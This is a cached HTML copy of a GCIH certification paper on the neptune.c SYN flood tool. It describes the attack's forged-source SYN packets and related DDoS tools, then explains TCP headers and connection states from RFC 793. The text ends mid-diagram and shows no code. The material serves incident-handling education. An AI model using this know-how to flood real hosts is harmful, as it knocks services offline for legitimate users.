<BASE HREF="http://www.giac.org/practical/Steven_Cardinal_ghic.doc"><table border=1 width=100%><tr><td><table border=1 bgcolor=#ffffff cellpadding=10 cellspacing=0 width=100% color=#ffffff><tr><td><font face=arial,sans-serif color=black size=-1>This is the html version of the file <A HREF="http://www.giac.org/practical/Steven_Cardinal_ghic.doc"><font color=blue>http://www.giac.org/practical/Steven_Cardinal_ghic.doc</font></a>.<br> <b><font color=#0039b6>G</font> <font color=#c41200>o</font> <font color=#f3c518>o</font> <font color=#0039b6>g</font> <font color=#30a72f>l</font> <font color=#c41200>e</font></b> automatically generates html versions of documents as we crawl the web.<br>To link to or bookmark this page, use the following url: <code>http://www.google.com/search?q=cache:AMMgjbJQ2dIC:www.giac.org/practical/Steven_Cardinal_ghic.doc+spoof+syn+neptune+source&amp;hl=en</code></font><br><br><center><font size=-2><i>Google is not affiliated with the authors of this page nor responsible for its content.</i></font></center></td></tr>
<tr><td>
<table border=0 cellpadding=0 cellspacing=0><tr><td><font face=arial,sans-serif color=black size=-1>These search terms have been highlighted:&nbsp;</font></td><td bgcolor=#ffff66><B><font face=arial,sans-serif color=black size=-1>spoof&nbsp;</font></B></td><td bgcolor=#A0FFFF><B><font face=arial,sans-serif color=black size=-1>syn&nbsp;</font></B></td><td bgcolor=#99ff99><B><font face=arial,sans-serif color=black size=-1>neptune&nbsp;</font></B></td><td bgcolor=#ff9999><B><font face=arial,sans-serif color=black size=-1>source&nbsp;</font></B></td></tr></table>
</td></tr></table></td></tr></table>
<hr>
<html>
<head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8"></meta>
<title></title>
</head>

<body>

  <h1><font size="4" face="Arial"><B style="color:black;background-color:#99ff99">Neptune</B>.c 
 the Birth of <B style="color:black;background-color:#A0FFFF">SYN</B> Flood Attacks</font></h1>
<p><font size="3" face="Arial">&nbsp; By Steven Cardinal</font></p>
<p><font size="3" face="Arial">&nbsp; Practical Assignment for GCIH 
v1.5c</font></p>
<h2><font size="3" face="Arial">Exploit Details:</font></h2>
&nbsp;<br />
<p><font size="3" face="Arial">Name: <B style="color:black;background-color:#99ff99">neptune</B>.c</font></p>
<p><font size="3" face="Arial">Variants: stacheldraht, Tribal Flood 
Network, TFN2K, trin00</font></p>
<p><font size="3" face="Arial">Operating System: Any TCP/IP based system</font></p>
<p><font size="3" face="Arial">Protocols/Services: Exploits the session 
establishment function of the TCP protocol.</font></p>
<p><font size="3" face="Arial">Brief Description: <B style="color:black;background-color:#99ff99">Neptune</B>.c generates 
a <B style="color:black;background-color:#A0FFFF">SYN</B> Flood attack against a network host by sending session establishment 
packets using a forged <B style="color:black;background-color:#ff9999">source</B> address. The receiving host will use up 
its resources waiting for the session to be confirmed and make itself 
unavailable to legitimate traffic.</font></p>
<h2><font size="3" face="Arial">Protocol Description</font></h2>
&nbsp;<br />
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Arial">Originally 
created to connect military and research facilities, the Internet has 
become a global marketplace. In addition to educational and government 
entities, new and existing businesses are using the Internet as a medium 
to connect with their partners and their customers. With faster and 
more reliable connections available, home use of the Internet is increasing, 
as well. The architecture of the Internet was designed assuming a level 
of trust among professionals. The openness of the protocols used on 
the Internet have allowed for their exploitation by those with less 
than honorable motives</font>&nbsp;<br /></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Arial">TCP/IP 
is the suite of networking protocols currently in use on the Internet. 
TCP, or Transmission Control Protocol, and IP, or Internet Protocol, 
are the major components of this suite. Along with other core protocols 
such as UDP, TCP and IP provide an internetworking framework for applications. 
Like other networking protocols, such as IPX/SPX, TCP/IP uses a layered 
architecture, with each layer providing specific functionality.</font>&nbsp;<br />
</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Arial">The 
network layer is responsible for passing packets around the network. 
In the TCP/IP protocol suite, the Internet Protocol (IP) is responsible 
for providing the delivery mechanism for packets of data sent between 
all systems connected to the network. The network layer accepts data 
from the transport layer and sends IP datagrams to the link layer, which 
communicates directly with networking hardware.</font>&nbsp;<br /></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Arial">The 
transport layer provides for the flow of data between two hosts. The 
TCP/IP protocol suite has two transport protocols: User Datagram Protocol 
(UDP) and Transmission Control Protocol (TCP). UDP provides a simple 
transport service for applications, but that transportation does not 
include guaranteed delivery, it is a best effort protocol. TCP provides 
a reliable transport service protecting against data loss, data corruption, 
packet reordering and data duplication. TCP accepts data from applications 
and sends TCP segments to the IP layer. Cisco, a global provider of 
networking products and solutions, explains the following features in 
their documentation:</font>&nbsp;<br /></p>
<ul><p><font size="3" face="Courier New">the services TCP provides 
are stream data transfer, reliability, efficient flow control, full-duplex 
operation, and multiplexing.</font></p></ul>
<ul><p><font size="3" face="Courier New"></font>&nbsp;<br /></p></ul>
<ul><p><font size="3" face="Courier New">TCP offers reliability by providing 
connection-oriented, end-to-end reliable packet delivery through an 
internetwork. It does this by sequencing bytes with a forwarding acknowledgment 
number that indicates to the destination the next byte the <B style="color:black;background-color:#ff9999">source</B> expects 
to receive. Bytes not acknowledged within a specified time period are 
retransmitted. The reliability mechanism of TCP allows devices to deal 
with lost, delayed, duplicate, or misread packets. A time-out mechanism 
allows devices to detect lost packets and request retransmission. (</font><a href="http://www.cisco.com/univercd/cc/td/doc/cisintwk/ito_doc/ip.htm#xtocid2236316"><font
 color="#0000FF" size="3" face="Arial">http://www.cisco.com/univercd/cc/td/doc/cisintwk/ito_doc/ip.htm#xtocid2236316</font></a><font
 size="3" face="Arial">)</font>&nbsp;<br /></p></ul>
<p><font size="3" face="Arial">According to the original specification 
for TCP, RFC 793:</font>&nbsp;<br /></p>
<p><font size="3" face="Courier New">The Transmission Control Protocol 
(TCP) is intended for use as a highly reliable host-to-host protocol 
between hosts in packet-switched computer communication networks, and 
in interconnected systems of such networks. (</font><a href="http://www.faqs.org/rfcs/rfc793.html"><font
 color="#0000FF" size="3" face="Courier New">www.faqs.org/rfcs/rfc793.html</font></a><font
 size="3" face="Courier New">)</font>&nbsp;<br />&nbsp;<br /></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Arial">In 
order to provide this reliability, TCP needs to maintain some status 
information for each TCP connection. Some of this status information 
is maintained for a system's own use, while other information is sent 
between communicating hosts using fields in the header of the TCP segment. 
The TCP header is shown below.</font>&nbsp;<br /></p>
<p><font size="3" face="Courier New">bit # </font></p>
<p><font size="3" face="Courier New">&nbsp;&nbsp;&nbsp; 0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
1&nbsp;1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 3 </font></p>
<p><font size="3" face="Courier New">&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
5 6&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </font></p>
<p><font size="3" face="Courier New">&nbsp;&nbsp; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ </font></p>
<p><font size="3" face="Courier New">&nbsp;&nbsp; |&nbsp;&nbsp; 16-bit <B style="color:black;background-color:#ff9999">source</B> port number&nbsp;&nbsp; | 
16-bit destination port number| </font></p>
<p><font size="3" face="Courier New">&nbsp;&nbsp; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ </font></p>
<p><font size="3" face="Courier New">&nbsp;&nbsp; |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 32-bit sequence number&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | </font></p>
<p><font size="3" face="Courier New">&nbsp;&nbsp; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ </font></p>
<p><font size="3" face="Courier New">&nbsp;&nbsp; |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 32-bit acknowledgement number&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
| </font></p>
<p><font size="3" face="Courier New">&nbsp;&nbsp; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ </font></p>
<p><font size="3" face="Courier New">&nbsp;&nbsp; | 4-bit |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |U|A|P|R|S|F|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | </font></p>
<p><font size="3" face="Courier New">&nbsp;&nbsp; | header| Reserved&nbsp; |R|C|S|S|Y|I|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
16-bit window size&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | </font></p>
<p><font size="3" face="Courier New">&nbsp;&nbsp; | length| (6 bits)&nbsp; |G|K|H|T|N|N|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
| </font></p>
<p><font size="3" face="Courier New">&nbsp;&nbsp; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ </font></p>
<p><font size="3" face="Courier New">&nbsp;&nbsp; |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 16-bit TCP checksum&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |&nbsp;&nbsp;&nbsp;&nbsp; 16-bit 
urgent pointer&nbsp;&nbsp;&nbsp;&nbsp; | </font></p>
<p><font size="3" face="Courier New">&nbsp;&nbsp; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ </font></p>
<p><font size="3" face="Courier New">&nbsp;&nbsp; $&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; options (if any)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $ </font></p>
<p><font size="3" face="Courier New">&nbsp;&nbsp; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ </font></p>
<p><font size="3" face="Courier New">&nbsp;&nbsp; $&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; data (if any)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $ </font></p>
<p><font size="3" face="Courier New">&nbsp;&nbsp; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ </font>&nbsp;<br />
&nbsp;<br /></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Arial">The 
sequence number (bits 32 through 63) is necessary to ensure that the 
communicating hosts know the order in which received packets should 
be assembled, thus providing a mechanism for ensuring the correct ordering 
of data for the application. </font>&nbsp;<br /></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Arial">When 
a connection is initially established with a <B style="color:black;background-color:#A0FFFF">SYN</B> packet, the TCP sequence 
number field contains the Initial Sequence Number (ISN). TCP guards 
against data loss by using an acknowledgement mechanism that requires 
the receiver to send back an acknowledgement number that contains the 
next sequence number that is expected. This will be the sequence number 
of the last segment of data that was successfully received, plus one. </font>&nbsp;<br />
</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Arial">By 
using a series of flags in the segment header, TCP is able to indicate 
what state a particular session is in. For the purposes of <B style="color:black;background-color:#99ff99">neptune</B>.c 
and <B style="color:black;background-color:#A0FFFF">SYN</B> Flood attacks, we will only look at three of those flags.</font>&nbsp;<br />
</p>
<p><font size="3" face="Arial">*&nbsp;<B style="color:black;background-color:#A0FFFF">SYN</B>.&nbsp;&nbsp;&nbsp; Synchronize sequence numbers to 
initiate a connection.</font></p>
<p><font size="3" face="Arial">*&nbsp;ACK.&nbsp;&nbsp;&nbsp; Indicates that the number in the 
acknowledgement field is valid.</font></p>
<p><font size="3" face="Arial">*&nbsp;RST.&nbsp;&nbsp;&nbsp; Reset the connection.</font>&nbsp;<br />
</p>
<p><font size="3" face="Arial">Using a diagram from RFC 793 we can see 
the status of these flags throughout a session. The following flags 
are also relevant to the diagram:</font>&nbsp;<br /></p>
<p><font size="3" face="Arial">*&nbsp;PSH.&nbsp;&nbsp;&nbsp; The receiver should pass this data 
to the application as soon as possible.</font></p>
<p><font size="3" face="Arial">*&nbsp;FIN.&nbsp;&nbsp;&nbsp; The sender has finished sending 
data.</font>&nbsp;<br /></p>
<p><font size="2" face="Courier New">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; active OPEN: </font></p>
<p><font size="2" face="Courier New">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ------------&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; passive OPEN: </font></p>
<p><font size="2" face="Courier New">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; init state&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ------------- </font></p>
<p><font size="2" face="Courier New">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; send <B style="color:black;background-color:#A0FFFF">SYN</B>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; +----------+&nbsp;&nbsp;&nbsp;&nbsp; init state </font></p>
<p><font size="2" face="Courier New">&nbsp;&nbsp; ---------------------------|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |--------------------------- </font></p>
<p><font size="2" face="Courier New">&nbsp; /&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |&nbsp; CLOSED&nbsp; |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; \ </font></p>
<p><font size="2" face="Courier New">&nbsp; |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -------------------&gt;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |&lt;-------------------&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
| </font></p>
<p><font size="2" face="Courier New">&nbsp; |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; CLOSE:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; +----------+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; CLOSE:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
\&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | </font></p>
<p><font size="2" face="Courier New">&nbsp; |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -----------&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -----------&nbsp;&nbsp;&nbsp; |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
| </font></p>
<p><font size="2" face="Courier New">&nbsp; |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; clear state&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; clear state&nbsp;&nbsp;&nbsp; |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
| </font></p>
<p><font size="2" face="Courier New">&nbsp; V&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; V </font></p>
<p><font size="2" face="Courier New">+----------+&nbsp;&nbsp;&nbsp;&nbsp; recv <B style="color:black;background-color:#A0FFFF">SYN</B>&nbsp;&nbsp;&nbsp;&nbsp; +----------+&nbsp;&nbsp;&nbsp;&nbsp; 
recv <B style="color:black;background-color:#A0FFFF">SYN</B>&nbsp;&nbsp;&nbsp;&nbsp; +----------+ </font></p>
<p><font size="2" face="Courier New">| <B style="color:black;background-color:#A0FFFF">SYN</B> SENT |-----------------&gt;| 
<B style="color:black;background-color:#A0FFFF">SYN</B> RCVD |&lt;-----------------|&nbsp; LISTEN&nbsp; | </font></p>
<p><font size="2" face="Courier New">+----------+&nbsp;&nbsp;&nbsp;&nbsp; send ACK&nbsp;&nbsp;&nbsp;&nbsp; +----------+&nbsp;&nbsp; 
send <B style="color:black;background-color:#A0FFFF">SYN</B>,ACK&nbsp;&nbsp; +----------+ </font></p>
<p><font size="2" face="Courier New">&nbsp;&nbsp;&nbsp;&nbsp; |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | </font></p>
<p><font size="2" face="Courier New">&nbsp;&nbsp;&nbsp;&nbsp; |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | recv ACK of <B style="color:black;background-color:#A0FFFF">SYN</B> </font></p>
<p><font size="2" face="Courier New">&nbsp;&nbsp;&nbsp;&nbsp; |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; V </font></p>
<p><font size="2" face="Courier New">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; \&nbsp;&nbsp;&nbsp;&nbsp; recv <B style="color:black;background-color:#A0FFFF">SYN</B>,ACK&nbsp;&nbsp;&nbsp;&nbsp; +------------+ </font></p>
<p><font size="2" face="Courier New">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ---------------------&gt;|ESTABLISHED 
| </font></p>
<p><font size="2" face="Courier New">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; send ACK&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; +------------+ </font></p>
<p><font size="2" face="Courier New">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |&nbsp;&nbsp;&nbsp; | </font></p>
<p><font size="2" face="Courier New">+----------+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; CLOSE:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /&nbsp;&nbsp;&nbsp; \&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; recv FIN&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+----------+ </font></p>
<p><font size="2" face="Courier New">|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |&lt;--------------------&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; --------------------&gt;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
| </font></p>
<p><font size="2" face="Courier New">|FIN WAIT-1|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; send FIN&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; send ACK&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
|CLOSE WAIT| </font></p>
<p><font size="2" face="Courier New">|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |-----------------------&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | </font></p>
<p><font size="2" face="Courier New">+----------+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; \&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; +----------+ </font></p>
<p><font size="2" face="Courier New">&nbsp;&nbsp;&nbsp;&nbsp; |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; \&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | recv FIN&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | </font></p>
<p><font size="2" face="Courier New">&nbsp;&nbsp;&nbsp;&nbsp; |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; \&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | ---------&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; CLOSE:&nbsp;&nbsp; | </font></p>
<p><font size="2" face="Courier New">&nbsp;&nbsp;&nbsp;&nbsp; | recv&nbsp;&nbsp; \&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | send ACK&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; --------&nbsp; | </font></p>
<p><font size="2" face="Courier New">&nbsp;&nbsp;&nbsp;&nbsp; | ACK&nbsp;&nbsp;&nbsp;&nbsp; \ recv FIN,ACK&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; send FIN&nbsp; 
| </font></p>
<p><font size="2" face="Courier New">&nbsp;&nbsp;&nbsp;&nbsp; V&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; \------------&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; V&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; V </font></p>
